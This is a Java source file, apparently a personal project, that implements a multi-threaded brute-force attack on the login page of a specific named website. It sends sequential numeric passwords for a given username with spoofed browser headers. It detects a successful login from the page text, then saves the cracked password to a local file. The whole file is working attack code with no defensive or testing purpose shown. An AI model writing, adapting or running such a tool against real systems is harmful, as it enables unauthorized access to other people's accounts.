package com.lsy.pc.post;

import com.lsy.pc.utils.PwdUtils;

import org.jsoup.Connection;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.select.Elements;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;

/**
 * @author LSY
 * @version 1.0
 * @date 2019/7/1 16:23
 */
public class ShanghaiOppoPost {


    private static String defeated = "错误的用户名或密码！";
    private static String success = "请选择功能:";

    /**
     * 递增暴力破译密码
     *
     * @param name      名字
     * @param threadNum 几条线程
     * @param num       第几条线路
     * @param start     从start开始
     */
    private void checkPwd(String name, int threadNum, int num, Long start) {
        String url = "http://shoppo.nesdo.cn/Login_Wap.aspx";
        HashMap<String, String> headers = new HashMap<>();
        Map<String, String> datas = new ConcurrentHashMap<>();
        headers.put("Content-Type", "application/x-www-form-urlencoded");
        headers.put("Accept-Encoding", "gzip, deflate");
        headers.put("Accept-Language", "zh-CN,zh;q=0.9,en;q=0.8");
        headers.put("Cache-Control", "max-age=0");
        headers.put("Connection", "keep-alive");
        headers.put("Origin", "http://shoppo.nesdo.cn");
        headers.put("Referer", "http://shoppo.nesdo.cn/Login_Wap.aspx");
        headers.put("Upgrade-Insecure-Requests", "1");
        headers.put("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36");
        datas.put("__EVENTTARGET", "");
        datas.put("__EVENTARGUMENT", "");
        datas.put("CmdLogin", "登录");

        long count = start + num;
        datas.put("TbUser", name);
        String pwd;
        while (true) {
            Connection connect = Jsoup.connect(url);
            System.out.println("=====count:"+count);
            System.out.println("=====start:"+start);
            System.out.println("=====num:"+num);
            System.out.println("=====name:"+name);
            pwd = PwdUtils.getNumPwd(count);
            System.out.println(pwd+"--");
            datas.put("TbPass", pwd);
            Connection connection = connect.headers(headers).data(datas);
            Document post;
            try {
                post = connection.post();
                assert post != null;
                Elements fonts = post.body().select("font");
                boolean isDefeated = fonts.stream().anyMatch(f -> f.toString().contains(defeated));
                if (isDefeated) {
                    count += threadNum;
                } else if (fonts.stream().anyMatch(f -> f.toString().contains(success))) {
                    // 成功试出密码
                    success(pwd);
                }
            } catch (Exception ignored) {

            }

        }


    }

    /**
     * 成功后的处理
     *
     * @param pwd 密码
     */
    private void success(String pwd) {
        try {
            System.out.println("!!!!!!!!!!!!!!!!!!" + pwd);
            File file = new File("F:\\MyTest\\pc\\src\\main\\resources\\txt\\json2.txt");
            file.exists();
            BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter(file));
            bufferedWriter.write(pwd);
            bufferedWriter.flush();
            bufferedWriter.close();
            System.exit(0);
        } catch (Exception e) {
            throw new RuntimeException("密码为:" + pwd);
        }
        throw new RuntimeException("密码为:" + pwd);
    }

    public void checkPwd(String name, int threadNum, Long start) {
        for (int i = 1; i <= threadNum; i++) {
            new Thread(new OppoThread(name, threadNum, i, start)).start();
        }
    }


    public class OppoThread implements Runnable {
        private String name;
        private int threadNum;
        private int num;
        private Long start;

        OppoThread(String name, int threadNum, int num, Long start) {
            this.name = name;
            this.threadNum = threadNum;
            this.num = num;
            this.start = start;
        }

        @Override
        public void run() {
            checkPwd(name, threadNum, num, start);
        }
    }
}
